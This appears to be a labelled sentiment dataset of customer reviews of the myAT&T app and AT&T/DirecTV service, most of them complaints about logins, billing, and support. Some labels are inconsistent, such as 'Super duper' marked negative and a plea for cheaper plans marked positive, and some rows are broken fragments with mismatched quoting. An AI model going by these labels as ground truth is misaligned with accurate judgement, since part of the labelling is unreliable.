"Saving passwords on AT&T servers is not good!!!  Can not sign into account or even look at my bill...this is the most worthless app I have ever seen or use....it’s useless! DELETED send me paper bills and welcome to AT&T THANKS PROGRAM!!!  Really, frustrated customer!

ALL I WANT IS TO SEE MY BILL, then pay it....this app is totally worthless!!!",negative
"ATT customer service and the app are NOT user friendly. The app constantly errors out and if I call in, it takes a least 20 minutes just to talk to a real person. Then I get transferred 2-3 times to the “correct” department after they try to up-sell me everything in the books. I have been with ATT for years and initially I really liked the service. But now, I will be shopping other providers to see if we can get better service and lower bills. 
Oh and you HAVE to create a nickname just to submit this helpful review and if it’s taken you can’t submit the rating. Well played ATT well played.",negative
Navigation is very nearly impossible. I don’t even use it anymore.,negative
I haven’t been able to log into my account via the app for months. It seems to have errors constantly!! This is just one more straw pushing me to leave AT&T.,negative
Get a quick snapshot of my account in. I time.,positive
I’m not sure why the rates have changed because I haven’t made any.,negative
Any attempts to receive assistance leaves me more frustrated. If the call disconnects or if you use live chat the person just stops responding. I’ve been a customer with ATT for years and I am now considering switching my services. Extremely Disappointed.,negative
Half of the time the app does not work.,negative
"The app is good, but the payment arrangement is hard too hard to locate.",negative
This app is my favorite.   It helps me get my bill paid fast without any inconvenience of having to go to a machine or a sales teller .  Other Companies should have this app for payments.,positive
I’m so over this company charging all this money and not honoring the agreements that they make. Then you have to jump through hoops to fix it. I will be leaving when my time is up.,negative
AT&T App is too slow.,negative
Can’t even log in to make a payment.  Worse app on my iPhone,negative
"If anyone even reads these...

We’ve had AT&T for close to 17years an never has are service been as bad as it has been the last few months. We called an complained time an time again, an all we get from the calls is “our towers show they all working like they should”. 
Well 4-5 years ago we had full service bars on our phones anywhere in our house, now it’s on a slow decline. We’re lucky to maybe get two bars if we go outside. An dropped calls our ridiculous...4-20 times a day even out where we should always have service no matter what. 
My husband runs his own business with one of our lines. An it’s to the point we are talking about changing to another company/service....

An here’s a suggestion...when you have us log into the app to pay two different ways “pay our dish bill an our phone bill” is a major inconvenience an hassle. Which I can’t even do. It makes me switch  off the app to Safari to pay the dish bill. I hate to go through the crap I do to pay the dish bill every month. Log in, wrong ID, wrong password, wrong ID, wrong password, when you just changed it over an over just to pay a bill that shouldn’t take 20 mins. Every month it’s the same. I don’t have that prob when I pay the phone bill part though the app. Please figure out way to select which one your paying through the AT&T app without logging into two different ways.",negative
When data speed is 125kbs this service is unusable.,negative
Don’t know if it’s the app or just horrible ATT service. Probably the latter!!,negative
Slow updating and loading  information.,negative
Confusion means mistakes and money to these guys... how could a phone bill be so complicated??,negative
51$ in 38 days.?,negative
"I have called 5 times and spent 3 hours each time. Every time the representatives told me that my bill would be reduced, but every time I received statements, my bills were higher than what the representatives told me. With Att for more than 20 years, I got enough this BS. Leaving for T- Mobil tomorrow!!!",negative
"BEWARE!!! IT IS BEST NOT TO USE THIS APP TO MAKE ANY CHANGES TO YOUR PAYMENTS. The credit card I used got hacked and upon learning this, I went into this app my ATT and changed my credit card number (same bank and type of card). I later got nasty notes from AT&T telling me I had not made a payment. When I finally found AT&T to let them know I had emails to prove I had changed my credit card number, they said it takes 4 to 6 weeks for this to take affect. This was definitely not in the subsequent emails I received confirming I had changed by payment account. I got slapped with a late fee that they were not sure could be reversed. It did wind up getting reversed, but not after costing me time and frustration, which is worth even more than the fee. I feel sorry for the app developers because this is likely not their problem, just bad communication between AT&T and the app. The way the app could do better would be to flash a big red sign in your face after changing your card information that you need to call AT&T directly if your changes need to be immediate.",negative
Excelente y rápido,positive
I can’t get the app to function. First it didn’t recognize my password. I reset my password to what it was and then I got to the next step... send me a verification text... no text arrived. I can do nothing with the app. It’s not worth downloading.,negative
I’m so disappointed with this app. It’s clunky and always difficult to log in because of my DirectTV linking. So frustrating. I feel like I have reset or look up my password every single month.,negative
"You used to be able to schedule a payment through the app; however, it appears that you have to make the payment for the ‘same’ day now - frustrating.  Also, it can be slow to respond.",negative
Best phone service ever!!!! Thank you At&t,positive
"First of all I have the ability to control my old phone numbers service notifications and other minor things. However the gentleman who has my old number is not too happy about this, and neither am I. I was outright lied to by a At&T operator(josh)about this situation. If I were you, I get your phone unlocked and switch to another provider.",negative
"Will m

How many times does AT&T want me to pay my bill.  Somehow I was connected to Telemundono although I live in Casa Grande. I do think I’ll contact FTC. This situation is wrong.  I’m 83 and need a reliable phone. I think I was tricked into signing a contract.,negative
"I have had too many issues with the visual voicemail feature not working consistently. When I have uses their ""Chat Live"" inside the myAT&T app, the chat agent deleted ALL my voicemails without my consent!!  AT&T advertises their bring your device plans but I am wondering if it is worth it as they are unable to provide the basic features such as visual voicemail. And have no way to retrieve the voicemails they deleted without my knowledge. The agent didn't even tell me they reset the voicemail!",negative
I have had to call multiple times and the service has yet to be cancelled as requested. I have called numerous times asking to cancel my 2 iPads and they are still on my account and I have been charged for them for the last 3 months and as if today they are still active! I am so ready to leave AT&T after so many years with you. I am owed a credit of $120 and it was supposed to be resolved by 6/26. Please call me!,negative
For days i try logging in and it won’t. I have reinstalled several times and it does the same thing.,negative
I told version bye because I can’t understand how their customer service talks and they couldn’t understand me. Now it seems this is happening again with AT&T!!! I shouldn’t have to repeat my name and/or security code. Give em pen and paper and have them write down those type of things so we dont have to repeat 20 times!,negative
I DONT HAVE ANY WIFI OR INTERNET WHERE I LIVE SO WHATS THE USE.,negative
"Muy mal servicio, no te ayudan en nada con el cable de Directv",negative
I am not able to use app to pay bill. Won’t forward to screen where you pay and observe account. Had to call anyway at least I didn’t have to pay service fees,negative
"I had canceled my tv package and I’m still getting charged for tv and a baseball package when everything is cancelled..
And I keep getting a different story by a different customer loyalty representative..
Don’t get any tv service!!!",negative
"We’ve reached our limit so instead of contacting me you up my bill $10 next month it will increase almost by $20. 
Maybe you should ask the customer before increasing their bill. 
I’m not very happy with the service",negative
For the last three month trying to set up access asking for help either by phone internet or in person still have not solved my problem,negative
"AT&T needs to consolidate their logins instead of having uverse, cell phone,  and internet accounts as separate divisions.",negative
I am so tired of ATT!!  Can never get a Live person in the US to resolve issues!!  It’s always a Major Fiasco!!  Seriously considering changing services!!!  Really done!!!,negative
Every time I log in there’s an issue.,negative
I was charged 2 times an $80 fee.  I canceled & received a bill stating I owed directv $0.00 now there’s another cancellation fee???  This is pure bs!,negative
At&t has the worst customer service I have seen. There call centers start out in another country and they don’t care how they treat you. The service is awful and it keeps going down! Then they want to charge you to fix it and if you do what they ask your service still doesn’t get fixed. At&t has grown so much they don’t care if they lose customers . I had direct tv and canceled the service because it keeps going down. There internet is the worst and not reliable and has the slowest speeds. There phone service is unreliable and the bills are never the same! Once I am done with my contract I will switch to a different service.,negative
I’ve never been so disappointed with any phone service or my other cable / internet service like I’m with direct tv. Everything time someone screws up my account i can never get my first call to fix it. I’ve to waste multiple lunch breaks to call and sit on the phone and get frustrated cause they can’t get it right the first time. I’m so disappointed that I spoke with someone last month (June 2019) cause my promotion ran out and he said he can’t adjust it when I never got a warning that it was going to run out to contact direct tv. Anyway since I was told by him that it’s going to be extended for 1 more year.  It’s still not adjusted off my bill. SO IF THIS IS NOT FIXED FOR MY JULY BILL I’m GOING TO CANCEL DIRECT TV.,negative
It just does not work at all. Was far easier with Verizon. I can’t wait until end of contract to go back. Agents lied about rebates to me and that has been the nicest experience in 7 months,negative
AT&T billing is down so much lately that the only way to know what you’re being charged is to call in. It’s a waste of time.,negative
"It theory this is a good app. In practice it needs work. Sometimes it takes too long for things to load. The chat function is a nice idea, but useless. Customer service is horrible. Agents read from a script and provide wrong information. Most of the time they are just stalling until a technician can come.  Which in my experience has been days from when my problem starts. AT&T please up your game with your customer service. I left Comcast several years ago because theirs sucked and your ms was great. Please fix before you turn into Comcast!",negative
AT&T has the worst customer service inaccurate billing missing leading sales and poor service that doesn’t work when you want it too. I’ll be switching back to spectrum ASAP. There customer service and monthly billing was accurate and the tv and internet service always worked as it should.,negative
I check my bill monthly and have had to reset password every time??,negative
Your app is Pure Crap.  It asks me security questions I have never seen. I have an iPhone X. It has Face ID for password but your stupid app keeps saying I havent been here for awhile and screws up everything. If I could have given you negative stars you would have gotten -10 stars,negative
Too complicated to navigate and not clear enough on how to help. As soon as my contract is up I’m switching to charter. Internet service is garbage for being “the fastest” internet provider. Trash experience being with y’all.,negative
This works super well!,positive
"You would think that AT&T would know a little bit about technology, but this app proves otherwise.  I assume being a monopoly for 60 years instilled a we don’t care about the customer attitude and it shows.   I have no idea what AT&T is trying to do with this app, but it is totally useless.",negative
Clicking on any of My billing options to view or pay my bill don’t work at all. It’s clicking alright but doing nothing!,negative
"You guys stink.  I wrote a review and could not send it!  I’m not writing it again.  Paying a bill isn’t as easy as writing a check, putting it in an envelope, affixing a stamp of which I have plenty, and then placing it in a mailbox.  Bravo snail Mail & phooey on your App!",negative
"How can a multi-national $1+ company be so bad. This has to one of the worst customer facing websites. Information is so slow, hard to find and incorrect. We need a-lot more competition  for a country of over 340million. AT&T you can-do better!!!",negative
The app stopped working. Does not accept credentials which do work in browsers. Changes error messages between try again later and username or password do not match records. This means can’t add on minutes if needed. Guess it’s time to move to a different carrier with apps that do work.,negative
since they updated the app it's unusable every time I use my password it won't except it and when it's reset it won't except it what the hell fix it or I'm going to a new carrier,negative
There have been three outages in my area in less than three months.  I pay almost $400.00 a month.  I dropped my landline to save on the cost a little bit.  I am paying for three lines for phone service and not one person can use their phone for at least six hours every outage.  It is ridiculous.  I have only been with AT&T since the ‘’90s when it started as BellSouth.  I am looking in to different plans.,negative
Att is the best at service ??????,positive
The prices be different every month! Thinking about canceling,negative
Very poor service on unlocking DTV & other apps that require  password. After flowing instructions 3x & try 6 reps no one was able to unlock my DTV access accounts !!!????,negative
Just like 90% of their customer service the app fails to help the customer unless you are paying your bill.,negative
"So first off it wasn’t easy setting the accounts to manage both these account but I finally set it up it was useful; perhaps too many clicks to get to objective but I was able to manage both accounts until couple of days again. 

One account is mine (AT&T), and the other is my parents (directv). Last week, I went into the app and the directv login just stopped working, and it was enable with Face ID. This is how I usually pay my parents bill. Now I’m trying to get into my at&t account to manage my sons data and I’m getting to my “home” screen that shows the usage bar, but this followed by an error, and taken back to the login screen. 

This is become really frustrating to not even be able to get into the my account.",negative
I have been trying to log in from my iPad 6 for two months and I get as far as the code input. It keeps coming back with “opps something went wrong”. I am able to log into my account via safari but not thru this app.,negative

I’ve called everyone I had little or no response, no call backs on six dropped calls that I left call back numbers for. My best guess is that you couldn’t get through or just don’t care . I’m just one customer, right ? As soon as I be feeling better and I get someone to take me I’m going back too Verizon Wireless. It was well worth it paying more money for the WONDERFUL SERVICE I HAD FOR OVER 25 YEARS ???? 4 dropped calls in all those years and no missed calls , failed text messages and no failed emails. Really? REALLY ???? I talked too one of your reps and had my due date changed too the 1st of each month and I just received a bill on the 30th ???????????? IF THIS GOE THROUGH MY BANK BEFOR THE 1st of July and I get an overdraft you will be paying it because I asked for it and it looks like you dropped another one ??????????????

The app is getting better gradually.  Need to fix the widget.,negative
Really?????? This app do not work I am always sign up and always asking to sign up on the main screen says HI IRMA and never let me see nothing not even to purchase nothing else,negative
The app is not allowing me to change the account number.,negative
There is absolutely no useful functionality in this app for a user. It’s built for AT&T’s convenience. Probably could be built in on afternoon. Absolutely worthless.,negative

Don’t choose this company unless you don’t value your time terrible customer service,negative
I am very tired of having to verify my password every month!!,negative
Having been an ATT customer for 7 years i now realize how much money they fleeced from me. I was paying 250-300 a month for 2 lines and whenever i checked why my bill was so high they never offered proper explanation. I’ve been a fool myself expecting this company of any sort of customer service.  Today’s my last day with ATT and i’m gonna take up the un-carrier. Goodbye nightmares and hello world!! ATT good luck stopping more customers from leaving,negative
Really poor client portal. Customer support is absolutely HORRIFIC!  Your Customer Service is ridiculously bad. As along time customer I find your portal horrible to use. The finger print authentication to access is absolutely useless. It does not work. Over navigation of the client portal is poorly arranged and hard to work through. I’m highly considering changing services and I know for a fact I will most likely change cable. Your fees are close to being consider price gouging and absolutely stupidity excessive.,negative
This app is really convenient,positive
Need stronger service and more affordable plans.,positive
"Ok much time talking, no action. Told one thing and given another. AT&T does not value long-standing customers so giving them what they want and going with Xfinity Tv and Internet who is half the price much greater Internet speed much easier installation. Additionally changed my cell service from AT&T to Xfinity/Verizon and reduce my cell bill by $100.
All told reduced my ATT bill for both services and saved $200.00 plus per month=  $2400 per year that is savings with better service.
 Good riddance AT&T",negative
Super duper,negative
Needs to be more robust..navigting.netween menus is slow,negative
"After having just spent one hour and forty six minutes on the phone with your “LOYALTY” department, I’ve come to the opinion there is no such department with ATT. I am so tired of my bill varying anywhere between $10 and $50 more each month with no changes being made by me on my account. Your representatives find a way to belt out every excuse under the sun, I’ve heard them all. Your plan has changed, your promotion has fallen off, blah blah blah. I’m really sick and tired of it all. I’ve been with ATT for more than 28 years and with Direct Tv for at least 10. My customer loyalty to you FAR OUTWEIGHS your loyalty and help to me.",negative
You can’t seem to understand what my request is!!!!,negative
It doesn’t allow me to adjust my payment amount when I’m trying to make a payment. Its annoying.,negative

"If I have my password saved in the app it should not need to ask me for it again. My phone has security already, I don’t need additional unwanted security from AT&T. And then when I reset my password after answering my security question, I should not need to verify with a text.",negative
"AT&T has the worst customer service I have ever experienced. 

I cringe any time I have to call to with a problem or question. 

I know I will be put on hold, transferred and treated horribly. 

The worst part is the language barrier as I assume I am speaking to someone in India that doesn’t understand my question or concern.

I get angry just thinking about it.",negative
"I have been trying to set up my account on the app and online for 3 days. Talked to 3 separate customer service reps for 45 minutes, none were helpful, and their final advice was to wait another day and try again. Can’t even access my bill to try to pay...still within my 30 day trial period, will likely head to the Verizon store this weekend.",negative
"Their attempt to make a fancy app is a total failure. The website does not allow me to login and the app is sometimes the same, doesn’t show all my accounts, etc",negative
Shame on you charging me more without asking me. How can you contractually add features or change my monthly plan without my permission?!!!!,negative
Every time I turn around at&t keeps raising my phone bill and I’m about done,negative
"First time in years we exceeded 1.5G data last month, at 10.5 per data usage summary, in one day!  But no one can prove it to me and I cannot access that data now.  As far as I can determine, it was fake so we would go unlimited.  Need to return to full transparency!  Think we need to attend next stockholders meeting or sell it off.",negative
Even the workers at the ATT store were unable to figure out how to get my password accepted.,negative
I have never actually talk to someone on chat they say it’s a very busy and they will get to you as soon as possible. My bill went up nine dollars. No wonder they don’t want to answer,negative
Not very good. 75% the time I can’t log in. My husband was told we can’t use WiFi to log in on the lap top! Other than that its been great service.,negative
The customer service was excellent helping for everything ??????,positive
AT&T is awesome!!!????????.,positive
"AT&T has started raising your bill under the guise of better service yet.. 5G e .. nothing but a marketing lie.  On top of that, they made terrible changes to the app.  And f you didn’t know. They are being sued for selling location services to bounty hunters.",negative
"With every merger update between att and directv, and every account/app change this company makes it more an more difficult to do the simplest things. 
I am a long term directv customer and att has made it a horrendous mess with bad customer service. I’m am very close to cutting the cord.",negative
"Half the time I open the app, it won’t load my info. The other half, it loads it incorrectly. 100% of the time, if I click any of the options once it does open, it times out or can’t open. I always hope things will be better with the next update but it never is.",negative
The WiFi Router provided by AT&T is CRAP - I am constantly hit with data charges even though the router indicates that it is on and fully functional. I am currently in the market for a more reliable service for me and all in my family group and extended network.,negative
At sign up I was told my 100.00 deposit wasn’t a deposit but the first 2 months of billing and I qualified for a $100.00 Visa card. Well a month later service was interrupted for non payment and no visa was ever added to be redeemed. Of course customer service has no idea and it’s pay or leave.,negative
Very bad app not friendly at all.,negative
"Very expensive for tv.  Been a direct TV fan for a lot of years but we are thinking of just going internet based tv.  $164.00 is too much a month for tv, no premium channels!",negative
This app froze during verification process. Surprising.,negative
"Just got two new phones by calling in and talked to Jonathan (in loyalty Dept). Ordered and received iPhone 7’s. Upgrades for us. Prices: $.99 and $99.99 with no activation fee. Thought, wow, what a deal for two 80 yr olds on fixed income. Well, now our bill shows waived activation fees reversed AND we are charged an access fee on each phone went from $25 to $40. So total bill went from $228 to $336. 
WOW! NOT A GOOD DEAL FOR TWO 89 yr OLDS ON FIXED INCOME. 
Hope we can rectify this problem. ??",negative
"Like ATT customer service, this app is terrible.  Most features don’t work and it always seems to be the one feature I need.",negative
This is the worst billing system I have ever been a part of. I hate it and can’t wait til this contact is up to get ride of you.,negative
"This app is by far the worst app I have ever tried to use. Most of the time it gets hung just trying to log in and I have to cancel and start over. It makes me change my password EVERY TIME because it tells me it’s the wrong password, even immediately after changing it and attempting to log in again. You would think a company that is supposedly technologically advanced could figure out how to make an app work correctly.",negative
"Says it sent code to my phone, never get one. Service was better years ago with Cingular...",negative
This app stopped working over two weeks ago. Ever time I call about it I get someone that doesn’t have a clue what I’m talking about. I guess I need to learn another language so I can find out how much data I have left. Been several more weeks and still can’t get it to work. This is just sad.,negative
Trying to log in on my cell and it won’t let me send verification code to my phone.,negative
"After setting up for a tech to come fix my internet, I’ve run into the worst customer service ever. 
I had a tech scheduled for Saturday between 8-12. Once 12:30 rolls around I have yet to see or hear from a tech. I contact ATT and I’m assured the tech is on the way and is about 20-30 minutes out. 2 HOURS later.... still no tech. So at 2:30 I contact ATT again, this time I am told there’s a tech 300 meters away checking the lines. Well that’s great, but my issue is the router not getting power. (This was stated at the initial contact which led to this scheduling). I go to the entrance of my subdivision where the ATT box is located and there’s no tech in site. I call again at 3 and hour phone call with ZERO people that speak English clear enough to understand, now I’m being told there’s no tech scheduled. After being on hold for 45 minutes to speak to a supervisor (again, doesn’t speak clear English) still no solution...",negative
"We-many of us in my area-George West, Tx have been having issues with our service for months. We have been without service, then told to use WiFi-this isn’t fair as we pay for service with AT&T. I have never received a credit for it. No I haven’t called-but we still have trouble to this day. You/AT&T really need to update the system in our area. 
Thanks",negative
"This is the most unreliable app I’ve ever had the misfortune of using.  
Completely frustrating most of the time.",negative
????????????????????????????????????????????????????????????????????????????????????????????????Worst customer service. Reps talk over you and circumvent the questions you ask. AT&T doesn’t care about their customers. They just collect money for their TRASH service. Dinosaur internet. POTATO WIFI.,negative
Spoke with Ben in call center and he head super helpful and kind. He took his time to explain the plan differences. He saved me from spending more for less!,positive
Will not update or tell me how much data I have used.,negative
Switching between statements cumbersome and the screen going blank is annoying when attempting to look at bills,negative
I love the AT&T app because I can pay my bill and manage my account quickly and easily!,positive
Changing our wireless plan without our consent,negative
Deleted and tried to reinstall several times and still not working. Failure every time you try to do anything. This app needs a major update.,negative
I do not like this,negative
"I swear, they charge you for ""free"" movies and take an hour to get you to rep that can help and have a horrible channel selection. If you have a choice, choose Comcast!!!!!!!",negative
Wow! Making a payment was super easy! Literally took me like 30 seconds.  Very cool.,positive
I am now paying more per month with no explanations. ??? What gives?,negative
Would give zero stars if I could.,negative
Very slow to responding.,negative
Extremely difficult to pay bills. ATT & Directv,negative
"If I log on to pay a bill - why are you asking me to take a survey ?????? 

Your timing is awful.  

Give me a break and don’t bother me.  

What good is me clicking a few random stars.  Who makes this survey garbage up? 

And I have a degree in social science.  Ask me about it and how I can focus the process and not be a nuisance.",negative
"Very annoying.. I have been trying to make a payment for more than two hours. Tried the phone and the app and still not able to make it. I was prompted to set up a new account and in that new account I was asked to link accounts. Each of those accounts has a user name and password that I had to enter or otherwise I would have to reset them. When I tried to reset them using the temporary passwords that At&t sent me by email, the system doesn’t recognize those password. Two hours later I  still can’t make the payment on the app and when I call the automated system would not recognize my key entered entries.. two hours and three  new accounts later I still haven’t made the payment.... can’t believe this is an app for one of the largest companies in the world. What a freaking mess!!",negative
"The application is not bad, but at@t customer service is horrible. I just paid my bill $239, and the application , after 5 days of my payment, shows additional $218. It was trying to charge my account but failed for some unknown reason.",negative
This service is terrible lately. I’m getting hit with ridiculous charges. My internet service is terrible and slow and most months my data usage is used up at the beginning of the cycle so our phones run so slow even when we’re using WiFi. Not at all happy with this service may be changing to a new one real soon. And I can’t even get a technician to chat with half the time!,negative
"It takes forever to open and then it only opens 
Into a notice and setting page. It will not open into account information. I have to open my old DTV APP. to get information about my bill. 
Please, just bring back the old DTV APP!!!",negative
Paid $50 to have my phone set up to call in the cruise.  Came home to a phone bill charged for usage totalling $185.  I did exactly as instructed when using the phone on the ship.  I def got screwed!,negative
AT&T makes it absolutely difficult to unlock your phone. I’ve been sending so many unlock requests but they are delaying n delaying.,negative
Terrible experience on phone with ATT and now useless app where I can’t find info on my insurance. :( Boo,negative
Haven’t been able to view anything other than my data usage on the app and same thing when I go to the website if this persists I might have to go elsewhere for my phone service. Trying to pay my bill and it’s just restarts and brings me back to data screen!!! Please help !! Will adjust rating if problem is fixed,negative
For months I have been trying to go online to update my billing address (a simple change of apartment number) and it keeps giving me a technical error message that this feature is temporarily down and will be fixed as soon as possible.  Unbelievable that some thing as simple as an address change can’t be done through their app because of their tech incompetence.,negative
The second time,negative
The bill amount shown each month on the app is never accurate. How am I suppose to trust autopay if I don’t know what possibly will be deducted each month?,negative
Many basic functions not working:(,negative
"I enjoy using the application; however, this updated version is not as good as the past version. It requires too much to get to the accounts and upon my signing in it asks me for my password several times despite me having Touch ID enabled. Using the app can be irritating at times.",negative
"It’s been a year, and this app always seems to have all kinds of errors and bugs. I’m on an iPhone XS Max, and half the time I can’t even make a payment cause it gets stuck on the load screen.

YOU HAVE HOW MUCH MONEY??? And you can’t even get your basic app to work properly?",negative
App hardly ever works,negative
"They system keep calculating my bill too soon, which makes my bill appear that there is a missed payment.",negative
"I called on the phone today to speak with someone about my bill, I received bad customer service. I was ask way to many questions and still didn’t receive what I needed. The customer service representative name was Tarse, she didn’t want to give me the correct spelling of her name and then she became very hesitant and still didn’t give me what I need she gave me a breakdown and it was still improper and still no pricing of I asked her several times what I needed!!! Very unhappy....",negative
"How can a company charge so much to so many people? Poor service, foreign customer service you can’t understand, the bill continue to increase, and The wait time on the phone is absurd. The phones are made as fragile as possible, with high insurance and deductibles, and what other device, that’s that small, costs an average between $700 and $1000 new?",negative
Such a bad example of cobbling together connectivity to multiple systems. UI is okay but the architecture and SSO is truly horrible. Have to reset my password EVERY time I log in because I have multiple ATT services and it can’t reconcile names and passwords although it tells me it can.,negative
Your customers service is tops. Your cell reception is not as good. We pay top dollar for our phones and I can't even use my phone at work. I work in Dupont center in St Augustine FL.  I'm to the point where I want to switch phone providers when our contract is over.,negative
"I can’t access my account to be able to make a payment, meanwhile time pass and my bill will be overdue, forcing me to pay a late fee. Two stars because the easiness of use when the app can function.",negative
"This review isn’t about the app. At&t has really gone downhill. They used to be the best but their service has really gone downhill. I only get alright service when I’m near downtown Denver. If I go outside that small area, my service gets very spotty. Changing to Verizon this year for sure.",negative
Very easy to navigate and it’s updated almost to the minute. Great app,positive
Good way to keep track of data. Easy to read,positive
"So today I tried to pay my AT&T account. Guess what - I can’t. Why? Because the account safety feature sends a text to a random phone on the account.

I set primary account for a reason, and it’s not so that I can be locked out of my account until I get a text from my daughter.",negative
"I used to get really good service and now I can only get one maybe two bars, and my calls fail constantly",negative
"The new update is horrible, completely horrible. 
But it’s AT&T so what was I thinking!!!!",negative
"MY ATT access to pay my bill is alway difficult. Your growth is interfering with customer ease f se and satisfaction. 

Spend some of your advertising budget on better performance for each customer that provides your company with success. 

May be time to get another carrier!",negative
Navigation is kind of funky and doesn’t work very well.  Crashes a lot.,negative
Where are my accounts? App only shows accounts I’ve cancelled.,negative
App doesn’t load half the time so it isn’t really convenient. AT&T has gone down hill a lot with bad service.,negative
Way overpriced,negative
Service is good but always place for improvement,positive
"This app has great features, but they never work.",negative
How about some real deals for loyal customers(10 years+)...once this provider lures you in there is no incentive stay except the hassle of transferring to a new provider...disappointing...why do I stay?!,negative
App takes way too long too load. I waited 15 minutes and it still did not load.,negative
"If I cannot schedule payments instead of date log in to APP.  I’ll start sending checks which has to create more work hours on your part, which is stupid. 
We travel and are out of country sometimes out of country during billing cycle.  If I could schedule payments to cover those times would be easier on us plus ATT. 

The trust factor isn’t good anyway.  I’ve had issues changing email address to new address.  Even with help of CSR. Now have all under one sign in with new address.  Except ATT UVerse. For some reason still get notification of bill due under old address. Which I’m ready to cancel. 
Here is another stupid reason why is nick name needed that keeps coming back because it’s already taken.",negative
"Customer service is a joke, they tell you one thing and when you get your bill it’s another story, don’t trust them and they have the worst service, your better off going with Dish or cable company. 

They don’t care about the customer, all they want to do is figure out how to give you the least service and how to charge way more then their service is worth. 

DO NOT GO WITH DIRECTV OR AT&T",negative
"This company combined my bill together with my wireless and internet. I did no t give permission or ask for this to be done. On top of that my bill increased $100 this month.  And the last agents I talked with did not decombine my account. Only for me to log into my
App and it says that I can’t see my wireless bill due to it being combined.   I want my bill to not be combined expeditiously.",negative
The app is not working here in Spain. It keeps asking me to try again in a few minutes (code L569). This has repeatedly occurred over the last two weeks. This occurs after I log in and it tells me I’m almost there and account info is being loaded. I’ve had to contact my son in the USA to access my account to check on AT&T international charges. It’s seems that they want to keep you guessing until they actually spring extra charges on your account.,negative
Muy conveniente y eficaz recomendable 100%,positive
It is such a pain to move from my TV account to my phone account. I really find it incredibly frustrating.,negative
"I ABSOLUTELY HATE, AND POSITIVELY DESPISE THE CURRENT AT&T WEBSITE. I GET TEXTS THAT SOMETHING IS DUE AND IF COURSE I WANT TO TAKE CARE IF IT however, SINCE I HAVE DIRECTTV, TELEPHONE AND DIGITAL LIFE.....AT&T doesn’t tell me which account it’s talking about. I go through their guessing game with error messages until I sick of it. I’ve called customer care ( which is a joke) and they want me to pay an additional $5.00 for a human!!!!!  So what gives?  Are they that broke that they need my $5.00???  
I am no longer under contract so just as soon as I can, I will be leaving AT&T forever!!!

AT&T has never had good customer service experience. I much money for only fair service.,negative
"Your app crashed on me, I can’t find out how much I owe on my iPhone.  Att has gone down hill over the last few years.  I’m thinking about switching to a different company.",negative
Too many updates and oversimplified. Rather see more options right on the loading page,negative
"AT&T showed up to my home and offer me a plan. I wanted to lower the cost of my cable, internet, and phone. I received my bill and this is twice the cost I was paying to WOE. I got rip off and I’m not happy with AT&T!",negative
"I have the worst times with this ap, loading is horrible, I can’t click on most things, takes forever to get things going! It’s so frustrating >.< at times the AP is down & I can’t pay my darn bill. It’s just dumb. 

I’ll give this ap 1 freaking star! Period. Once you make this ap better maybe I’ll give it two.",negative
"If I could give AT&T negative stars, I would. I have problems with no signal on my phone. No one can help me so I give this company one month to fix it, if not, I’m switching companies.",negative
"The app and your desk top application is embarrassing for you to be ATT  it is always broken and not working.

Your rates are too high and your tool and applications are terrible.

You have also destroyed direct tv with the worst customer service on the planets.

Att you should rebrand yourself a and hire non at home customer service ghetto agents.",negative
"Have not been able to get a correct bill for the last 5 months. Spent two and a half hours on a Saturday trying to get corrected and thought I did. Nope, error showed up on current invoice. Got to love ATT.",negative
"No way possible your 4.4 out of 5 is correct. Scam! Tried to spend money at AT&T, but guess what? I couldn’t because your lousy app don’t work. Couldn’t view updated options. WHAT A JOKE!  I guess with all the money AT&T makes, no big deal.",negative
"ATT is a ripoff, they offer you buy one phone get one free but the they keep forgetting to credit your account for the free one. I’m sure hoping you won’t catch it.",negative

I try to reset and it locks says to send reminder and then locked again. Waste of time. And chat is offline.,negative
Worst service EVER,negative
I received a video message from AT&T stating i could login to my prepaid account on the my AT&T app.. after downloading the app I attempted to login. Every time i do the app redirects me to the web browser. Obviously i can not use the app for my at&t prepaid account.,negative
"Logging in has been an extremely infuriating hassle because a pop up shows stating that I apparently have the User ID wrong even after I received an automated message where the credentials were the same as what I typed in. I can’t buy anything within the app, which is still very laggy to navigate which I’m surprised at considering it’s 2019, because it says my cart is empty when I go to check out. I really can’t believe the website is better which isn’t saying much and there’s this push to install the app. Please fix these log in problems especially.",negative
This app is not good at all not user friendly,negative
Kicks me out constantly,negative
Non of the buttons work.  Can’t even get to my bill.,negative
"I constantly get frustrated with this app. It seems as though it is always freezing, stalling, moving slow or not updating account info.  I have had it over a period of several years and it has never improved. For a company that provides internet and smarts phones they are lacking.",negative
Every time I open the app it shows a blank white screen.,negative
Doesn’t work,negative
"Links don’t work most of the time and still having screen freezes, I have an iPhone 8plus so this shouldn’t be happening.",negative

Every. Single. Month.",negative
AT&T has been terrible. POOR service. No data.,negative
"Internet is slow.  
The ATT  app is impossible & ridiculous to use.   When I try to check internet data usage, it will not go to page, just sits there asleep and most times will kick me out  3 or 4 times.

One would think that a company as big as AT&T would be able to develop a website that would work properly.   10 out of ten times I have issues.   Never has it worked as it should in trying to check data usage.   We have limited usage so checking is of the upmost importance.

Another complaint is that due to the fact that usage is always  2 days behind I never know our total for the month.    I cannot see our totals except for 2 days before the end of the month. 

AND I have been told Uverse is 2 blocks from my house.  One agent told me last spring that I would have fiber optic probably by summer of 2018.     Still nothing and apparently no plans for it in my neighborhood.    Guess what something else is now close.   

Your prices are way to high for your service.   
Those are my thoughts.  Fortunately you no longer a monopoly.",negative
I swear the day I can log in to pay my bill and it shows the current month and not a weird previous month without me having to search high and low for the current bill will be the day we shut the service off!,negative
Don’t like this app can’t pay my bill,negative

3) When I select view my bill it won't load. Phone signal is adequate to do so.",negative
App locks. Cannot complete desired objective,negative
"App constantly logs you out and forces you to log back in even when you use the remember me function. 

Proving your identity also makes no sense. When signing in you get a prompt to confirm you identity by text... on the same phone you’re using. Literally makes no sense. Just do a device registration",negative
This app never works right after my contract is up I’m moving on. This is how I pay my bill,negative
"I don’t know what updates occurred but my app no longer works. I try to log in using Facebook ID and it forces to to enter a password (yes, the password is correct because I can long on fine through my laptop), then it cycles like it’s going to access my account, then says login timed out. I tried removing and installing the app, same thing. I tried resetting my password, same thing. When I had access, before the login issues, it wouldn’t let me click to see or pay my bill. Fix your broken app",negative
Every month when I use the app to make a payment it acts up! Please get this fixed! Thanks,negative
I can’t get the app to work always have to login on my computer to pay my bill. I use to be able to do it from my phone. I have called into ATT but unsuccessful getting it to work.,negative

"Can’t log in, server errors, hard to see Bill, very poorly designed app.",negative
Your app is pissing my off right now!!!!!!,negative
ATT makes appointments to come fix your internet then they don not show up or call. Worst data provider worst customer service I have ever seen,negative
